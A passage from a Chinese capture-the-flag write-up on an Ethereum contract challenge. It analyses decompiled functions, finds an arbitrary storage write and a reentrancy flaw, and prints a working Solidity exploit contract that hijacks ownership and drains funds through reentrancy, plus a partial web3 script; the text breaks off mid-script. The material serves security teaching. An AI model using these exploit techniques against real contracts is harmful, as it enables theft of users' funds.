class="hljs-comment">[0x00]</span> / 0x0100 ** 0x14 &amp; 0xff) != !!0x01) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    var var0 = storage<span class="hljs-comment">[0x01]</span> - 0x01;<br>    var var1 = 0x0cf4;<br>    var var2 = 0x01;<br>    var var3 = var0;<br>    func_1489(var2, var3);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="0x0339f300-revise-uint256-bytes32"><a href="#0x0339f300-revise-uint256-bytes32" class="headerlink" title="0x0339f300 revise(uint256,bytes32)"></a>0x0339f300 revise(uint256,bytes32)</h3><p>剩下得几个函数分析和上面的差不多。</p><p>这个函数有一个最主要的漏洞就是能够覆盖任意的storage值，payforflag那个函数是我们最终需要调用的，但那个函数要求<code>msg.sender == storage[0x00]</code>，所以这里就能利用这个函数覆盖掉storage[0x00]为msg.sender。</p><blockquote><p>要求 storage[0x05] == 0x02 ，<br>要求 storage[0x06] == 0x02 ，<br>要求 storage[0x00] / 0x0100 ** 0x14 &amp; 0xff == 0x01 ，即 storage[0x00] 的高 96 位数值要求为 1 ，这个满足 guess 即可<br>要求 arg0 &gt;= storage[0x01]<br>满足上述要求后，后面进行了 storage 写操作，这里是任意写操作，可以看代码的注释，因为写入storage的位置可控了<br>然后判断 storage[0x01] &gt;= 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000 ，经过 retract() 后即可满足,如果不满足则<code>storage[0x06] = storage[0x06] + 0x01;</code></p></blockquote><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">function revise(<span class="hljs-keyword">var</span> arg0, <span class="hljs-keyword">var</span> arg1) &#123;<br>    <span class="hljs-keyword">if</span> (storage[0x01] &lt; 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>    <br>    <span class="hljs-keyword">memory</span>[0x00:0x20] = msg.sender;<br>    <span class="hljs-keyword">memory</span>[0x20:0x40] = 0x05;<br>    <br>    <span class="hljs-keyword">if</span> (storage[keccak256(<span class="hljs-keyword">memory</span>[0x00:0x40])] != 0x02) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>    <br>    <span class="hljs-keyword">memory</span>[0x00:0x20] = msg.sender;<br>    <span class="hljs-keyword">memory</span>[0x20:0x40] = 0x06;<br>    <br>    <span class="hljs-keyword">if</span> (storage[keccak256(<span class="hljs-keyword">memory</span>[0x00:0x40])] != 0x02) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>    <br>    <span class="hljs-keyword">if</span> (!!(storage[0x00] / 0x0100 ** 0x14 &amp; 0xff) != !!0x01) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>    <br>    <span class="hljs-keyword">var</span> var0 = arg1;<br>    <span class="hljs-keyword">var</span> var1 = 0x01;<br>    <span class="hljs-keyword">var</span> var2 = arg0;<br>    <br>    <span class="hljs-keyword">if</span> (var2 &gt;= storage[var1]) &#123; <span class="hljs-keyword">assert</span>(); &#125;<br>    <br>    <span class="hljs-keyword">memory</span>[0x00:0x20] = var1; <span class="hljs-comment">//0x01</span><br>    <span class="hljs-comment">//这里就是一个漏洞点了，因为var2是我们传入的参数arg0，意味着写入storage的位置我们可控，所以就可能存在slot内容覆盖了。</span><br>    storage[keccak256(<span class="hljs-keyword">memory</span>[0x00:0x20]) + var2] = var0;<br>    <br>    <span class="hljs-keyword">if</span> (storage[0x01] &gt;= 0xffffffffff000000000000000000000000000000000000000000000000000000) &#123;<br>        <span class="hljs-keyword">memory</span>[0x00:0x20] = msg.sender;<br>        <span class="hljs-keyword">memory</span>[0x20:0x40] = 0x06;<br>        <span class="hljs-keyword">var</span> temp0 = keccak256(<span class="hljs-keyword">memory</span>[0x00:0x40]);<br>        storage[temp0] = storage[temp0] + 0x01;<br>        <span class="hljs-keyword">return</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        var0 = 0x00;<br>        var1 = 0x0676;<br>        var2 = 0x01;<br>        <span class="hljs-keyword">var</span> var3 = var0;<br>        func_1489(var2, var3);<br>        revert(<span class="hljs-keyword">memory</span>[0x00:0x00]);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="0xa9059cbb-transfer-address-uint256"><a href="#0xa9059cbb-transfer-address-uint256" class="headerlink" title="0xa9059cbb transfer(address,uint256)"></a>0xa9059cbb transfer(address,uint256)</h3><p>这里是进行 storage[0x04] 之间的转账操作，一般这种转账涉及变量就类似    <code>mapping (address =&gt; uint) public balanceOf;</code>这种</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params"><span class="hljs-keyword">var</span> arg0, <span class="hljs-keyword">var</span> arg1</span>) <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-keyword">var</span> r0</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> var0 = <span class="hljs-number">0x00</span>;<br>    <span class="hljs-keyword">var</span> var1 = <span class="hljs-number">0x11d7</span>;<br>    <span class="hljs-keyword">var</span> var2 = msg.sender;<br>    <span class="hljs-keyword">var</span> var3 = arg0;<br>    <span class="hljs-keyword">var</span> var4 = arg1;<br>    func_126F(var2, var3, var4);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0x01</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>func_126F中是对于转账两账户之间的余额操作，其实就是一个账户余额加上value，另一个账户减去value。</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><span class="hljs-comment">//argo是from账户， arg1是to账户， arg2是value转账数额</span><br>    function func_126F(<span class="hljs-keyword">var</span> arg0, <span class="hljs-keyword">var</span> arg1, <span class="hljs-keyword">var</span> arg2) &#123;<br>        <span class="hljs-keyword">var</span> var0 = 0x00;<br>        <span class="hljs-keyword">var</span> var1 = var0;<br>        <span class="hljs-keyword">var</span> var2 = 0x00;<br>        <span class="hljs-keyword">var</span> var3 = var2;<br>    <br>        <span class="hljs-keyword">if</span> (arg1 &amp; 0xffffffffffffffffffffffffffffffffffffffff == 0xffffffffffffffffffffffffffffffffffffffff &amp; 0x00) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>    <br>        <span class="hljs-keyword">if</span> (arg2 &lt;= 0x00) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>    <br>        <span class="hljs-keyword">var</span> temp0 = arg0;<br>        <span class="hljs-keyword">memory</span>[0x00:0x20] = temp0 &amp; 0xffffffffffffffffffffffffffffffffffffffff;<br>        <span class="hljs-keyword">memory</span>[0x20:0x40] = 0x04;<br>        <span class="hljs-keyword">var</span> temp1 = storage[keccak256(<span class="hljs-keyword">memory</span>[0x00:0x40])];<br>        var0 = temp1;<br>        <span class="hljs-keyword">var</span> temp2 = arg1;<br>        <span class="hljs-keyword">memory</span>[0x00:0x20] = temp2 &amp; 0xffffffffffffffffffffffffffffffffffffffff;<br>        <span class="hljs-keyword">memory</span>[0x20:0x40] = 0x04;<br>        var1 = storage[keccak256(<span class="hljs-keyword">memory</span>[0x00:0x40])];<br>        <span class="hljs-keyword">var</span> temp3 = arg2;<br>        <span class="hljs-keyword">memory</span>[0x00:0x20] = temp0 &amp; 0xffffffffffffffffffffffffffffffffffffffff;<br>        <span class="hljs-keyword">memory</span>[0x20:0x40] = 0x04;<br>        var2 = storage[keccak256(<span class="hljs-keyword">memory</span>[0x00:0x40])] - temp3;<br>        <span class="hljs-keyword">memory</span>[0x00:0x20] = temp2 &amp; 0xffffffffffffffffffffffffffffffffffffffff;<br>        <span class="hljs-keyword">memory</span>[0x20:0x40] = 0x04;<br>        var3 = storage[keccak256(<span class="hljs-keyword">memory</span>[0x00:0x40])] + temp3;<br>    <br>        <span class="hljs-keyword">if</span> (var0 &lt; temp3) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>    <br>        <span class="hljs-keyword">if</span> (var3 &lt;= var1) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>    <br>        <span class="hljs-keyword">var</span> temp4 = var2;<br>        <span class="hljs-keyword">memory</span>[0x00:0x20] = arg0 &amp; 0xffffffffffffffffffffffffffffffffffffffff;<br>        <span class="hljs-keyword">memory</span>[0x20:0x40] = 0x04;<br>        storage[keccak256(<span class="hljs-keyword">memory</span>[0x00:0x40])] = temp4;<br>        <span class="hljs-keyword">var</span> temp5 = var3;<br>        <span class="hljs-keyword">memory</span>[0x00:0x20] = arg1 &amp; 0xffffffffffffffffffffffffffffffffffffffff;<br>        <span class="hljs-keyword">memory</span>[0x20:0x40] = 0x04;<br>        storage[keccak256(<span class="hljs-keyword">memory</span>[0x00:0x40])] = temp5;<br>    <br>        <span class="hljs-keyword">if</span> (var0 + var1 == temp4 + temp5) &#123; <span class="hljs-keyword">return</span>; &#125;<br>        <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">assert</span>(); &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h3 id="0x2e1a7d4d-withdraw-uint256"><a href="#0x2e1a7d4d-withdraw-uint256" class="headerlink" title="0x2e1a7d4d withdraw(uint256)"></a>0x2e1a7d4d withdraw(uint256)</h3><blockquote><p>要求 storage[0x05] == 0x02<br>要求 storage[0x06] == 0x03<br>要求退款每次 &gt;= 100<br>要求 storage[0x04] &lt; arg0，即余额比每次退款要多 即对应        require(balanceOf[msg.sender] &gt;= _amount);<br>要求合约余额比退款要多 即require(address(this).balance &gt;= _amount);<br>满足条件后，storage[0x04] -= arg0 ，然后调用 call 函数进行转账（这里存在重入攻击，因为没有对 gas 做控制），最后 storage[0x05] -= 0x01</p></blockquote><figure class="highlight inform7"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs inform7">function withdraw(var arg0) &#123;<br>    if (msg.sender != storage<span class="hljs-comment">[0x00]</span> &amp; 0xffffffffffffffffffffffffffffffffffffffff) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x05;<br>    <br>    if (storage<span class="hljs-comment">[keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>)]</span> != 0x02) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x06;<br>    <br>    if (storage<span class="hljs-comment">[keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>)]</span> != 0x03) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    if (arg0 &lt; 0x64) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x04;<br>    <br>    if (storage<span class="hljs-comment">[keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>)]</span> &lt; arg0) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    if (address(address(this)).balance &lt; arg0) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    var temp0 = arg0;<br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x04;<br>    var temp1 = keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>);<br>    storage<span class="hljs-comment">[temp1]</span> = storage<span class="hljs-comment">[temp1]</span> - temp0;<br>    var temp2 = memory<span class="hljs-comment">[0x40:0x60]</span>;<br>    memory<span class="hljs-comment">[temp2:temp2 + 0x00]</span> = address(msg.sender).call.gas(msg.gas).value(temp0)(memory<span class="hljs-comment">[temp2:temp2 + memory<span class="hljs-comment">[0x40:0x60]</span> - temp2]</span>);<br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x05;<br>    var temp3 = keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>);<br>    storage<span class="hljs-comment">[temp3]</span> = storage<span class="hljs-comment">[temp3]</span> - 0x01;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h2><p>分析完函数，太多信息了。。无法连起来看，这里总结一下。</p><p>payforflag函数是我们最终需要调用的函数，但是有三个条件</p><ul><li>一个账户尾数需要0x111，这个有相应网站直接生成</li><li>要求 storage[0x06] == 0x03 ，可以依次调用gift(),buy(),revise()即可</li><li>要求 storage[0x05] &gt; 0x8ac7230489e80000  这个可以重入攻击</li><li>要求 msg.sender == storaget[0x00] 即onlyowner修饰 这个可以覆盖storage[0x00]为msg.sender</li></ul><p>gift函数</p><ul><li>要求 address(msg.sender).code.length == 0，即需要在合约的constructor中调用。 所以说无法重复调用，不然只用这个函数就能随意storage[0x05]，storage[0x06]的值。</li><li>要求 msg.sender 后三个数为 0x111 这个也可以直接生成相应账户</li><li>满足上述条件后，storage[0x04] = 100 ， storage[0x05] += 1 ， storage[0x06] += 1</li></ul><p>guess函数</p><ul><li>首先要求 arg0 == block.blockHash(block.number - 0x01) % 3 ，这个很容易满足，因为利用区块号生成的随机数是可预测的</li><li>满足要求后，将storage[0x00] 的address地址的前一个字节设为1，其实就是bool和address放在一个slot下的情况，这里只改了那个bool值。</li></ul><p>buy函数</p><ul><li>要求 storage[0x06] == 1 ，这些在攻击合约构造函数中调用 gift() 空投可以完成</li><li>要求 storage[0x05] == 1 ，这里同上。</li><li>要求 storage[0x02] == 1 ，结合 func_06CE 来看，只需使得 0xa8286aca 第二次调用返回 1 即可</li><li>要求storage[0x00]的从低位数第21字节 == 0x01（前二十即为一个address），这个同guess函数要求</li></ul><p>满足上述要求后，storage[0x05] += 1 ，storage[0x06] += 1</p><p>revise函数<br>存在漏洞可以覆盖任意storage的值。</p><ul><li>要求 storage[0x05] == 0x02 ，</li><li>要求 storage[0x06] == 0x02 ，</li><li>要求 storage[0x00] / 0x0100 ** 0x14 &amp; 0xff == 0x01 ，即 storage[0x00] 的高 96 位数值要求为 1 ，这个满足 guess 即可</li><li>要求 arg0 &gt;= storage[0x01]<br>满足上述要求后，后面进行了 storage 写操作，这里是任意写操作所以可以覆盖任意storage的值，所以就解决了payforflag的一个要求，可以将storage[0x00]修改为 msg.sender</li></ul><p>func_06CE(arg0)函数</p><ul><li>调用了两次同一个函数0xa8286aca</li><li>第一次调用仅仅就判断了函数的返回值取反之后是满足true还是false，如果通过if判断则会进行第二次调用0xa8286aca函数，并将结果赋值给storage[0x02].</li></ul><p>这里解答一下上面自己的疑问，就是wp里面说到两次返回结果不一样并不是一定不一样的，这是我们自己根据其它函数和攻击链子需要判断出来的这里两次调用函数返回结果需要不一样。首先第一次需要让它返回false，取反之后就是true，然后第二次需要返回true，然后storage[0x02] = true，才能满足调用buy函数的要求。</p><p>所以最终链子就是wp里的</p><blockquote><ul><li><p>生成符合要求的外部账户，在 constructor 中调用 gift()</p></li><li><p>调用 0x23de8635 func_06CE ，这里要利用 bytecode 的方式部署，因为我们不知道 func_06CE 中调用的接口函数 0xa8286aca 的函数名，所以利用 bytecode 的方式部署第三方合约，将 fake(uint256) 对应的函数选择 id 改为 0xa8286aca 即可，这样调用 0xa8286aca 就是调用我们重写之后的 0xa8286aca 了，用 bytecode 部署可以用在线的 <a href="https://www.myetherwallet.com/">myetherwallet</a></p></li><li><p>调用 guess() ，然后调用 buy()</p></li><li><p>调用 retract() 和 revise() 修改 owner</p></li><li><p>部署第三方子合约，第三方子合约调用 gift() 和 transfer() 给攻击合约转账，然后调用 withdraw() 进行重入攻击</p></li><li><p>最后调用 payforflag 即可</p></li></ul></blockquote><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>首先生成一个符合要求的用户。<br><img src="https://img-blog.csdnimg.cn/img_convert/6dd26fe6fa3af1e65a6f7c3dcdf5b0c1.png"></p><h3 id="部署第三方合约，在构造函数中调用gift函数"><a href="#部署第三方合约，在构造函数中调用gift函数" class="headerlink" title="部署第三方合约，在构造函数中调用gift函数"></a>部署第三方合约，在构造函数中调用gift函数</h3><p>然后利用bytecode部署第三方合约,将bytecode中的<code>fake(uint256)</code>函数签名0xc7375737改为0xa8286aca</p><figure class="highlight fortran"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs fortran">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.23</span>;<br><br>contract hack &#123;<br>    address instance_address = <span class="hljs-number">0</span>xcCaECd49e4Ea39C536291193E9301dF4d5E0A654;<br>    uint have_withdraw = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-built_in">int</span> cnt = <span class="hljs-number">0</span>;<br>    <br>    constructor() payable &#123;<br>        // gift()<br>        address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>x24b04905));<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span></span> step1() <span class="hljs-keyword">public</span> &#123;<br>        // storage[<span class="hljs-number">0</span>x02] == <span class="hljs-number">1</span><br>        address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>x23de8635), <span class="hljs-number">0</span>);<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span></span> fake(uint256 _i) <span class="hljs-keyword">public</span> returns(uint256) &#123;<br>        <span class="hljs-keyword">if</span>(cnt == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>        cnt = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span></span> step2() <span class="hljs-keyword">public</span> &#123;<br>        // guess(uint256)<br>        uint256 v = uint256(<span class="hljs-keyword">block</span>.blockhash(<span class="hljs-keyword">block</span>.<span class="hljs-keyword">number</span>-<span class="hljs-number">1</span>)) % <span class="hljs-number">3</span>;<br>        address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>x9189fec1), v);<br>        // buy()<br>        address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>xa6f2ae3a));<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span></span> step3() <span class="hljs-keyword">public</span> &#123;<br>        // retract()<br>        assert(address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>x47f57b32)));<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span></span> step4() <span class="hljs-keyword">public</span> &#123;<br>        // revise(uint256,bytes32)<br>        uint256 solt = <span class="hljs-number">2</span>**<span class="hljs-number">256</span>-<span class="hljs-number">0</span>xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6;<br>        address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>x0339f300), solt, <span class="hljs-number">2</span>**<span class="hljs-number">160</span> + uint256(address(this)));<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span></span> step5() <span class="hljs-keyword">public</span> &#123;<br>        // withdraw<br>        address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>x2e1a7d4d), <span class="hljs-number">100</span>);<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span> payable &#123;<br>        <span class="hljs-keyword">if</span> (have_withdraw &lt;=<span class="hljs-number">2</span> &amp;&amp; msg.sender == instance_address) &#123;<br>            have_withdraw += <span class="hljs-number">1</span>;<br>            address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>x2e1a7d4d), <span class="hljs-number">100</span>);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span></span> step6(string b64email) <span class="hljs-keyword">public</span> &#123;<br>        address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>x6bc344bc), b64email);<br>    &#125;<br>&#125;<br><br>contract son &#123;<br>    address instance_address = <span class="hljs-number">0</span>xcCaECd49e4Ea39C536291193E9301dF4d5E0A654;<br>    <br>    constructor() payable &#123;<br>        // gift()<br>        address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>x24b04905));<br>        // <span class="hljs-built_in">transfer</span><br>        address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>xa9059cbb), address(<span class="hljs-number">0</span>xE281b17958fc2a9dc089Cc8c13c09bE787f88111), <span class="hljs-number">100</span>);<br><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>部署完可以看到合约地址最后十二位为0x111，并且按照上述分析，部署完第三方合约在构造函数会调用gift所以此时storage[0x04]应该为100,storage[0x05]和storage[0x06]都为1<br>利用如下合约验证</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">from eth_abi import abi, encode_abi<br>from  eth_utils import  keccak<br>from <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Crypto</span>.</span><span class="hljs-module"><span class="hljs-identifier">Util</span>.</span></span>number import bytes_to_long<br>from web3 import Web3,HTTPProvider<br>from hexbytes import *<br>def <span class="hljs-built_in">bytes</span><span class="hljs-constructor">Tohex(<span class="hljs-params">data</span>)</span>:<br>   # return hex(<span class="hljs-built_in">bytes</span><span class="hljs-constructor">_to_long(<span class="hljs-params">data</span>)</span>).rjust(<span class="hljs-number">66</span>,<span class="hljs-character">&#x27;0&#x27;</span>)<br>   return hex(<span class="hljs-built_in">bytes</span><span class="hljs-constructor">_to_long(<span class="hljs-params">data</span>)</span>)<br><br>contract_address     = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Web3</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">ChecksumAddress(<span class="hljs-string">&quot;0xcCaECd49e4Ea39C536291193E9301dF4d5E0A654&quot;</span>)</span><br><br>rpc = 填写自己账户的rpc<br><br>w3 = <span class="hljs-constructor">Web3(HTTPProvider(<span class="hljs-params">rpc</span>)</span>)<br>print(w3.is<span class="hljs-constructor">Connected()</span>)<br><br># balance = w3.from<span class="hljs-constructor">Wei(<span class="hljs-params">w3</span>.<span class="hljs-params">eth</span>.<span class="hljs-params">getBalance</span>(<span class="hljs-params">wallet_address</span>)</span>, <span class="hljs-string">&quot;ether&quot;</span>)<br># print(balance)<br>slot4 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Web3</span>.</span></span>keccak(encode<span class="hljs-constructor">_abi([&#x27;<span class="hljs-params">address</span>&#x27;,&#x27;<span class="hljs-params">uint</span>&#x27;], [&#x27;0xE281b17958fc2a9dc089Cc8c13c09bE787f88111&#x27;,0x04])</span>)<br>slot5 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Web3</span>.</span></span>keccak(encode<span class="hljs-constructor">_abi([&#x27;<span class="hljs-params">address</span>&#x27;,&#x27;<span class="hljs-params">uint</span>&#x27;], [&#x27;0xE281b17958fc2a9dc089Cc8c13c09bE787f88111&#x27;,0x05])</span>)<br>slot6 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Web3</span>.</span></span>keccak(encode<span class="hljs-constructor">_abi([&#x27;<span class="hljs-params">address</span>&#x27;,&#x27;<span class="hljs-params">uint</span>&#x27;], [&#x27;0xE281b17958fc2a9dc089Cc8c13c09bE787f88111&#x27;,0x06])</span>)<br><br>print(<span class="hljs-string">&quot;storage4 : &quot;</span> + <span class="hljs-built_in">bytes</span><span class="hljs-constructor">Tohex(<span class="hljs-params">w3</span>.<span class="hljs-params">eth</span>.<span class="hljs-params">getStorageAt</span>(<span 